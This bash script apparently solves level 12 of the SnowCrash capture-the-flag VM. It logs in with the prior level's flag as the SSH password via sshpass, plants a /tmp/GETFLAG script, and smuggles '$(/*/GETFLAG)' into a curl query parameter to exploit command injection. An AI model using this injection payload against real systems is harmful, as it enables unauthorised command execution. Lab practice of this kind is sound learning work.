#!/bin/bash
MY_PATH=$(dirname "$0")            # relative
MY_PATH=$(cd "$MY_PATH" && pwd)    # absolutized and normalized

HOST=level12@$1
SSHPORT=4242
PASSWORD=$(cat $MY_PATH/../../level11/flag)

if [ $# -eq 1 ]; then
	sshpass -p $PASSWORD ssh -q $HOST -p $SSHPORT<<'ENDSSH'
	echo "[+] Create /tmp/GETFLAG executable."
	echo "getflag > /tmp/flag" > /tmp/GETFLAG
	chmod +x /tmp/GETFLAG

	echo "[+] Curl snowcrash machine with x arg executable."
	curl -s 'http://192.168.1.17:4646?x=$(/*/GETFLAG)'
	cat /tmp/flag
ENDSSH
else
	printf "usage: ./script.sh [host]\n\texample [host] - 192.168.1.128"
fi
